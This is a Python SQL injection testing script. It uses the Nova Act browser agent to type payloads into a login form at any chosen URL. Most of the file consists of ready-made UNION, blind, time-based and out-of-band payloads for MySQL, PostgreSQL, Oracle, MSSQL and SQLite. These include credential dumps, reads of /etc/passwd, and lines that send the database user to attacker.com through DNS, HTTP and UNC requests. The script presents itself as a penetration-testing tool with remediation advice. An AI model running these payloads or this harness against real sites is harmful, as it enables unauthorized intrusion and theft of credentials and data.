#!/usr/bin/env python3
"""
Advanced SQL Injection Testing Framework

This module performs comprehensive SQL injection testing across multiple
database management systems and injection techniques:
- Union-based SQL injection
- Boolean-based blind SQL injection  
- Time-based blind SQL injection
- Out-of-band SQL injection

Supported database systems:
- MySQL/MariaDB
- PostgreSQL
- Oracle
- Microsoft SQL Server
- SQLite

Requirements: nova-act, python-dotenv
"""

import time
import os
import json
import argparse
from datetime import datetime
from typing import Dict, List, Any, Optional
from dotenv import load_dotenv
from nova_act import NovaAct

# Charger les variables d'environnement
load_dotenv()

class AdvancedSQLInjectionTester:
    """Main class for advanced SQL injection testing"""
    
    def __init__(self, target_url: str = "http://localhost:5000", headless: bool = False):
        self.target_url = target_url
        self.headless = headless
        self.nova_api_key = os.environ.get("NOVA_ACT_API_KEY")
        self.results = {
            "timestamp": datetime.now().isoformat(),
            "target_url": target_url,
            "tests_performed": {
                "union_based": [],
                "boolean_blind": [],
                "time_based": [],
                "out_of_band": []
            },
            "summary": {
                "total_tests": 0,
                "vulnerabilities_found": 0,
                "success_rate": 0.0
            }
        }
        
        if not self.nova_api_key:
            raise ValueError("NOVA_ACT_API_KEY not found. Check your .env file")

    def get_union_payloads(self) -> Dict[str, List[str]]:
        """Returns Union-based payloads for different database systems"""
        return {
            "mysql": [
                "' UNION SELECT 1,user(),database(),version()-- ",
                "' UNION SELECT null,null,table_name,null FROM information_schema.tables-- ",
                "' UNION SELECT 1,concat(username,':',password),3,4 FROM users-- ",
                "' UNION SELECT 1,@@version,@@datadir,4-- ",
                "' UNION SELECT 1,load_file('/etc/passwd'),3,4-- ",
            ],
            "postgresql": [
                "' UNION SELECT 1,current_user,current_database(),version()-- ",
                "' UNION SELECT null,null,tablename,null FROM pg_tables-- ",
                "' UNION SELECT 1,username||':'||password,3,4 FROM users-- ",
                "' UNION SELECT 1,version(),current_setting('data_directory'),4-- ",
                "' UNION SELECT 1,pg_read_file('/etc/passwd',0,1000),3,4-- ",
            ],
            "oracle": [
                "' UNION SELECT 1,user,sys_context('USERENV','DB_NAME'),banner FROM v$version WHERE rownum=1-- ",
                "' UNION SELECT null,null,table_name,null FROM all_tables-- ",
                "' UNION SELECT 1,username||':'||password,3,4 FROM users-- ",
                "' UNION SELECT 1,banner,null,null FROM v$version WHERE rownum=1-- ",
            ],
            "mssql": [
                "' UNION SELECT 1,user_name(),db_name(),@@version-- ",
                "' UNION SELECT null,null,name,null FROM sysobjects WHERE xtype='U'-- ",
                "' UNION SELECT 1,username+':'+password,3,4 FROM users-- ",
                "' UNION SELECT 1,@@version,@@servername,4-- ",
                "' UNION SELECT 1,name,null,null FROM master..sysdatabases-- ",
            ],
            "sqlite": [
                "' UNION SELECT 1,sqlite_version(),null,null-- ",
                "' UNION SELECT null,null,name,null FROM sqlite_master WHERE type='table'-- ",
                "' UNION SELECT 1,username||':'||password,3,4 FROM users-- ",
                "' UNION SELECT 1,sql,null,null FROM sqlite_master-- ",
            ]
        }

    def get_boolean_blind_payloads(self) -> Dict[str, List[str]]:
        """Returns Boolean Blind payloads for different database systems"""
        return {
            "mysql": [
                "admin' AND (SELECT SUBSTRING(user(),1,1))='r'-- ",
                "admin' AND (SELECT COUNT(*) FROM information_schema.tables)>50-- ",
                "admin' AND (SELECT LENGTH(database()))>5-- ",
                "admin' AND (SELECT ASCII(SUBSTRING((SELECT user()),1,1)))>100-- ",
                "admin' AND (SELECT COUNT(*) FROM users)>0-- ",
            ],
            "postgresql": [
                "admin' AND (SELECT SUBSTRING(current_user,1,1))='p'-- ",
                "admin' AND (SELECT COUNT(*) FROM pg_tables)>20-- ",
                "admin' AND (SELECT LENGTH(current_database()))>5-- ",
                "admin' AND (SELECT ASCII(SUBSTRING(current_user,1,1)))>100-- ",
                "admin' AND (SELECT COUNT(*) FROM users)>0-- ",
            ],
            "oracle": [
                "admin' AND (SELECT SUBSTR(user,1,1) FROM dual)='O'-- ",
                "admin' AND (SELECT COUNT(*) FROM all_tables)>100-- ",
                "admin' AND (SELECT LENGTH(user) FROM dual)>5-- ",
                "admin' AND (SELECT ASCII(SUBSTR(user,1,1)) FROM dual)>100-- ",
            ],
            "mssql": [
                "admin' AND (SELECT SUBSTRING(user_name(),1,1))='d'-- ",
                "admin' AND (SELECT COUNT(*) FROM sysobjects WHERE xtype='U')>5-- ",
                "admin' AND (SELECT LEN(db_name()))>5-- ",
                "admin' AND (SELECT ASCII(SUBSTRING(user_name(),1,1)))>100-- ",
            ],
            "sqlite": [
                "admin' AND (SELECT SUBSTR(sqlite_version(),1,1))='3'-- ",
                "admin' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0-- ",
                "admin' AND (SELECT LENGTH(sqlite_version()))>5-- ",
                "admin' AND (SELECT COUNT(*) FROM users)>0-- ",
            ]
        }

    def get_time_based_payloads(self) -> Dict[str, List[str]]:
        """Returns Time-based payloads for different database systems"""
        return {
            "mysql": [
                "admin' AND (SELECT SLEEP(5))-- ",
                "admin' AND (SELECT IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0))-- ",
                "admin' AND (SELECT IF((SELECT SUBSTRING(user(),1,1))='r',SLEEP(5),0))-- ",
                "admin' AND (SELECT BENCHMARK(5000000,SHA1('test')))-- ",
            ],
            "postgresql": [
                "admin' AND (SELECT pg_sleep(5))-- ",
                "admin' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN pg_sleep(5) ELSE pg_sleep(0) END)-- ",
                "admin' AND (SELECT CASE WHEN SUBSTRING(current_user,1,1)='p' THEN pg_sleep(5) ELSE pg_sleep(0) END)-- ",
            ],
            "oracle": [
                "admin' AND (SELECT COUNT(*) FROM all_objects,all_objects,all_objects)>1000000-- ",
                "admin' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN DBMS_LOCK.sleep(5) ELSE 0 END FROM dual)-- ",
            ],
            "mssql": [
                "admin' AND (SELECT COUNT(*) FROM sysusers AS s1,sysusers AS s2,sysusers AS s3,sysusers AS s4,sysusers AS s5)>1000-- ",
                "admin' AND (WAITFOR DELAY '00:00:05')-- ",
                "admin' IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '00:00:05'-- ",
            ],
            "sqlite": [
                "admin' AND (SELECT COUNT(*) FROM sqlite_master,sqlite_master,sqlite_master,sqlite_master,sqlite_master)>100000-- ",
                # SQLite doesn't have native SLEEP function, using heavy query instead
                "admin' AND (SELECT randomblob(100000000))-- ",
            ]
        }

    def get_out_of_band_payloads(self) -> Dict[str, List[str]]:
        """Returns Out-of-band payloads for different database systems"""
        return {
            "mysql": [
                "admin' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',user(),'.attacker.com\\\\share')))-- ",
                "admin' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',database(),'.attacker.com\\\\share')))-- ",
            ],
            "postgresql": [
                "admin' AND (SELECT * FROM dblink('host=attacker.com user=test dbname=test','SELECT version()'))-- ",
                "admin' AND (COPY (SELECT current_user) TO PROGRAM 'nslookup '||current_user||'.attacker.com')-- ",
            ],
            "oracle": [
                "admin' AND (SELECT UTL_HTTP.request('http://attacker.com/oracle/'||user) FROM dual)-- ",
                "admin' AND (SELECT UTL_INADDR.get_host_address(user||'.attacker.com') FROM dual)-- ",
            ],
            "mssql": [
                "admin' AND (SELECT * FROM OPENROWSET('SQLOLEDB','Network=DBMSSOCN;Address=attacker.com,80;uid=sa;pwd=password','SELECT 1'))-- ",
                "admin' EXEC master..xp_dirtree '\\\\\\\\'+user_name()+'.attacker.com\\\\share'-- ",
            ]
        }

    def test_union_based_injection(self) -> List[Dict[str, Any]]:
        """Tests Union-based SQL injection vulnerabilities"""
        print("\nTesting Union-based SQL injection...")
        results = []
        
        union_payloads = self.get_union_payloads()
        
        for db_type, payloads in union_payloads.items():
            print(f"\nTesting {db_type.upper()}:")
            
            for i, payload in enumerate(payloads, 1):
                print(f"  Payload {i}/{len(payloads)}: {payload[:50]}...")
                
                try:
                    with NovaAct(
                        starting_page=self.target_url,
                        ignore_https_errors=True,
                        headless=self.headless
                    ) as nova:
                        
                        result = nova.act(f"""
                        Testing Union-based SQL injection on {self.target_url}.
                        
                        OBJECTIVE: Determine if payload reveals database information
                        
                        STEPS:
                        1. Navigate to {self.target_url}
                        2. Enter in "Username" field: {payload}
                        3. Enter in "Password" field: password
                        4. Click "Sign In"
                        
                        RESPONSE ANALYSIS:
                        - SUCCESS if you see database information (usernames, versions, tables)
                        - SUCCESS if you see data that should not be visible
                        - FAILED if you only see normal login error
                        - ERROR if you see SQL error message
                        
                        Database type being tested: {db_type.upper()}
                        
                        Return ONLY: SUCCESS, FAILED, or ERROR
                        """)
                        
                        test_result = {
                            "db_type": db_type,
                            "payload": payload,
                            "status": result.strip(),
                            "timestamp": datetime.now().isoformat()
                        }
                        
                        results.append(test_result)
                        
                        if "SUCCESS" in result:
                            print(f"    [+] VULNERABLE ({db_type})")
                            self.results["summary"]["vulnerabilities_found"] += 1
                        else:
                            print(f"    [-] No vulnerability detected")
                        
                        time.sleep(1)  # Delay between tests
                        
                except Exception as e:
                    print(f"    [!] Error: {str(e)}")
                    test_result = {
                        "db_type": db_type,
                        "payload": payload,
                        "status": f"ERROR: {str(e)}",
                        "timestamp": datetime.now().isoformat()
                    }
                    results.append(test_result)
        
        self.results["tests_performed"]["union_based"] = results
        return results

    def test_boolean_blind_injection(self) -> List[Dict[str, Any]]:
        """Tests Boolean Blind SQL injection vulnerabilities"""
        print("\nTesting Boolean Blind SQL injection...")
        results = []
        
        blind_payloads = self.get_boolean_blind_payloads()
        
        for db_type, payloads in blind_payloads.items():
            print(f"\nTesting {db_type.upper()} (Boolean Blind):")
            
            for i, payload in enumerate(payloads, 1):
                print(f"  Payload {i}/{len(payloads)}: {payload[:50]}...")
                
                try:
                    with NovaAct(
                        starting_page=self.target_url,
                        ignore_https_errors=True,
                        headless=self.headless
                    ) as nova:
                        
                        # Test with true condition
                        result_true = nova.act(f"""
                        Testing Boolean Blind SQL injection on {self.target_url}.
                        
                        OBJECTIVE: Test if application responds differently based on condition
                        
                        STEPS:
                        1. Navigate to {self.target_url}
                        2. Enter in "Username": {payload}
                        3. Enter in "Password": password
                        4. Click "Sign In"
                        
                        ANALYSIS:
                        - If you access dashboard = TRUE CONDITION
                        - If you stay on login = FALSE CONDITION
                        - Note exact behavior
                        
                        Test type: {db_type.upper()} Boolean Blind
                        
                        Return: ACCESS_DASHBOARD or STAY_LOGIN
                        """)
                        
                        # Test with false condition (modified payload)
                        false_payload = payload.replace("='r'", "='x'").replace("='p'", "='x'").replace("='O'", "='x'").replace("='d'", "='x'").replace("='3'", "='9'").replace(">100", "<50").replace(">50", "<10").replace(">20", "<5").replace(">5", "<1").replace(">0", "<0")
                        
                        nova.act(f"Navigate to {self.target_url}")
                        
                        result_false = nova.act(f"""
                        Test with false condition:
                        
                        STEPS:
                        1. Enter in "Username": {false_payload}
                        2. Enter in "Password": password
                        3. Click "Sign In"
                        
                        Return: ACCESS_DASHBOARD or STAY_LOGIN
                        """)
                        
                        # Analyze differences
                        is_vulnerable = (
                            "ACCESS_DASHBOARD" in result_true and 
                            "STAY_LOGIN" in result_false
                        )
                        
                        test_result = {
                            "db_type": db_type,
                            "payload": payload,
                            "true_condition_result": result_true.strip(),
                            "false_condition_result": result_false.strip(),
                            "vulnerable": is_vulnerable,
                            "timestamp": datetime.now().isoformat()
                        }
                        
                        results.append(test_result)
                        
                        if is_vulnerable:
                            print(f"    [+] VULNERABLE - Different behavior detected")
                            self.results["summary"]["vulnerabilities_found"] += 1
                        else:
                            print(f"    [-] No vulnerability detected")
                        
                        time.sleep(2)  # Longer delay for blind testing
                        
                except Exception as e:
                    print(f"    [!] Error: {str(e)}")
                    test_result = {
                        "db_type": db_type,
                        "payload": payload,
                        "status": f"ERREUR: {str(e)}",
                        "timestamp": datetime.now().isoformat()
                    }
                    results.append(test_result)
        
        self.results["tests_performed"]["boolean_blind"] = results
        return results

    def test_time_based_injection(self) -> List[Dict[str, Any]]:
        """Tests Time-based SQL injection vulnerabilities"""
        print("\nTesting Time-based SQL injection...")
        results = []
        
        time_payloads = self.get_time_based_payloads()
        
        for db_type, payloads in time_payloads.items():
            print(f"\nTesting {db_type.upper()} (Time-based):")
            
            for i, payload in enumerate(payloads, 1):
                print(f"  Payload {i}/{len(payloads)}: {payload[:50]}...")
                
                try:
                    with NovaAct(
                        starting_page=self.target_url,
                        ignore_https_errors=True,
                        headless=self.headless
                    ) as nova:
                        
                        # Measure normal response time
                        start_time = time.time()
                        nova.act(f"""
                        Navigate to {self.target_url}
                        Enter 'normal_user' in Username
                        Enter 'normal_password' in Password
                        Click Sign In
                        """)
                        normal_time = time.time() - start_time
                        
                        # Test with time-based payload
                        nova.act(f"Navigate to {self.target_url}")
                        start_time = time.time()
                        
                        result = nova.act(f"""
                        Time-based injection test:
                        
                        1. Enter in Username: {payload}
                        2. Enter in Password: password
                        3. Click Sign In
                        
                        Type: {db_type.upper()} Time-based
                        """)
                        
                        payload_time = time.time() - start_time
                        time_difference = payload_time - normal_time
                        
                        # Vulnérable si délai significatif (>3 secondes de différence)
                        is_vulnerable = time_difference > 3.0
                        
                        test_result = {
                            "db_type": db_type,
                            "payload": payload,
                            "normal_time": round(normal_time, 2),
                            "payload_time": round(payload_time, 2),
                            "time_difference": round(time_difference, 2),
                            "vulnerable": is_vulnerable,
                            "timestamp": datetime.now().isoformat()
                        }
                        
                        results.append(test_result)
                        
                        if is_vulnerable:
                            print(f"    [+] VULNERABLE - {time_difference:.2f}s delay detected")
                            self.results["summary"]["vulnerabilities_found"] += 1
                        else:
                            print(f"    [-] No significant delay ({time_difference:.2f}s)")
                        
                        time.sleep(1)
                        
                except Exception as e:
                    print(f"    [!] Error: {str(e)}")
                    test_result = {
                        "db_type": db_type,
                        "payload": payload,
                        "status": f"ERREUR: {str(e)}",
                        "timestamp": datetime.now().isoformat()
                    }
                    results.append(test_result)
        
        self.results["tests_performed"]["time_based"] = results
        return results

    def test_out_of_band_injection(self) -> List[Dict[str, Any]]:
        """Tests Out-of-band SQL injection vulnerabilities (simulation)"""
        print("\nTesting Out-of-band SQL injection...")
        results = []
        
        oob_payloads = self.get_out_of_band_payloads()
        
        print("NOTE: Out-of-band tests require external server to capture requests.")
        print("These tests only verify if payloads are accepted without errors.\n")
        
        for db_type, payloads in oob_payloads.items():
            print(f"\nTesting {db_type.upper()} (Out-of-band):")
            
            for i, payload in enumerate(payloads, 1):
                print(f"  Payload {i}/{len(payloads)}: {payload[:50]}...")
                
                try:
                    with NovaAct(
                        starting_page=self.target_url,
                        ignore_https_errors=True,
                        headless=self.headless
                    ) as nova:
                        
                        result = nova.act(f"""
                        Out-of-band injection test on {self.target_url}:
                        
                        1. Navigate to {self.target_url}
                        2. Enter in Username: {payload}
                        3. Enter in Password: password
                        4. Click Sign In
                        
                        ANALYSIS:
                        - POTENTIAL if no SQL error and normal behavior
                        - FAILED if SQL error or payload rejection
                        
                        Type: {db_type.upper()} Out-of-band
                        
                        Return: POTENTIAL, FAILED, or ERROR
                        """)
                        
                        test_result = {
                            "db_type": db_type,
                            "payload": payload,
                            "status": result.strip(),
                            "note": "Nécessite validation externe pour confirmer",
                            "timestamp": datetime.now().isoformat()
                        }
                        
                        results.append(test_result)
                        
                        if "POTENTIAL" in result:
                            print(f"    [!] POTENTIALLY VULNERABLE (external validation required)")
                        else:
                            print(f"    [-] Payload rejected")
                        
                        time.sleep(1)
                        
                except Exception as e:
                    print(f"    [!] Error: {str(e)}")
                    test_result = {
                        "db_type": db_type,
                        "payload": payload,
                        "status": f"ERREUR: {str(e)}",
                        "timestamp": datetime.now().isoformat()
                    }
                    results.append(test_result)
        
        self.results["tests_performed"]["out_of_band"] = results
        return results

    def run_all_tests(self, test_types: List[str] = None) -> Dict[str, Any]:
        """Executes all SQL injection tests"""
        print("Starting advanced SQL injection tests")
        print(f"Target: {self.target_url}")
        print(f"Mode: {'Headless' if self.headless else 'Visible'}")
        print("="*80)
        
        if test_types is None:
            test_types = ["union", "blind", "time", "oob"]
        
        # Exécution des tests selon les types demandés
        if "union" in test_types:
            self.test_union_based_injection()
        
        if "blind" in test_types:
            self.test_boolean_blind_injection()
        
        if "time" in test_types:
            self.test_time_based_injection()
        
        if "oob" in test_types:
            self.test_out_of_band_injection()
        
        # Calcul des statistiques finales
        total_tests = sum(len(tests) for tests in self.results["tests_performed"].values())
        self.results["summary"]["total_tests"] = total_tests
        
        if total_tests > 0:
            self.results["summary"]["success_rate"] = (
                self.results["summary"]["vulnerabilities_found"] / total_tests * 100
            )
        
        # Sauvegarde des résultats
        self.save_results()
        self.print_summary()
        
        return self.results

    def save_results(self):
        """Save results to a JSON file"""
        filename = f"advanced_sql_injection_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)
        
        print(f"\nResults saved to: {filename}")

    def print_summary(self):
        """Display results summary"""
        print("\n" + "="*80)
        print("ADVANCED SQL INJECTION TEST SUMMARY")
        print("="*80)
        
        summary = self.results["summary"]
        print(f"Target tested: {self.target_url}")
        print(f"Date/Time: {self.results['timestamp']}")
        print(f"Total tests: {summary['total_tests']}")
        print(f"Vulnerabilities found: {summary['vulnerabilities_found']}")
        print(f"Success rate: {summary['success_rate']:.1f}%")
        
        print(f"\nDETAILS BY TEST TYPE:")
        for test_type, tests in self.results["tests_performed"].items():
            if tests:
                vulnerabilities = sum(1 for test in tests 
                                   if test.get("vulnerable") or "SUCCESS" in test.get("status", ""))
                print(f"  - {test_type.replace('_', ' ').title()}: {len(tests)} tests, {vulnerabilities} vulnerabilities")
        
        print(f"\nRECOMMENDATIONS:")
        if summary['vulnerabilities_found'] > 0:
            print("  [!] SQL Injection vulnerabilities have been detected!")
            print("  [*] Implement prepared statements")
            print("  [*] Validate and escape all user inputs")
            print("  [*] Test regularly with different payload types")
        else:
            print("  [+] No SQL Injection vulnerabilities detected in these tests")
            print("  [*] Continue testing with other payloads and methods")
        
        print("="*80)


def main():
    """Fonction principale avec support des arguments en ligne de commande"""
    parser = argparse.ArgumentParser(
        description="Tests avancés d'injection SQL avec Nova Act",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemples d'utilisation:
  python advanced_sql_injection_test.py
  python advanced_sql_injection_test.py --headless
  python advanced_sql_injection_test.py --target_url http://example.com/login
  python advanced_sql_injection_test.py --union_only
  python advanced_sql_injection_test.py --blind_only --time_only
        """
    )
    
    parser.add_argument(
        "--target_url",
        default="http://localhost:5000",
        help="URL cible pour les tests (défaut: http://localhost:5000)"
    )
    
    parser.add_argument(
        "--headless",
        action="store_true",
        help="Exécuter en mode headless (sans interface graphique)"
    )
    
    parser.add_argument(
        "--union_only",
        action="store_true",
        help="Exécuter seulement les tests Union-based"
    )
    
    parser.add_argument(
        "--blind_only",
        action="store_true",
        help="Exécuter seulement les tests Boolean Blind"
    )
    
    parser.add_argument(
        "--time_only",
        action="store_true",
        help="Exécuter seulement les tests Time-based"
    )
    
    parser.add_argument(
        "--oob_only",
        action="store_true",
        help="Exécuter seulement les tests Out-of-band"
    )
    
    args = parser.parse_args()
    
    # Déterminer quels types de tests exécuter
    test_types = []
    if args.union_only:
        test_types.append("union")
    if args.blind_only:
        test_types.append("blind")
    if args.time_only:
        test_types.append("time")
    if args.oob_only:
        test_types.append("oob")
    
    # If no specific types, run all tests
    if not test_types:
        test_types = ["union", "blind", "time", "oob"]
    
    try:
        # Create and execute tester
        tester = AdvancedSQLInjectionTester(
            target_url=args.target_url,
            headless=args.headless
        )
        
        results = tester.run_all_tests(test_types)
        
        print(f"\n[+] Tests completed successfully!")
        print(f"[*] {results['summary']['vulnerabilities_found']} vulnerability(ies) detected")
        
    except ValueError as e:
        print(f"[-] Configuration error: {e}")
        print("[!] Make sure NOVA_ACT_API_KEY is configured in your .env file")
        return 1
    
    except KeyboardInterrupt:
        print(f"\n[!] Tests interrupted by user")
        return 1
    
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return 1
    
    return 0


if __name__ == "__main__":
    exit(main())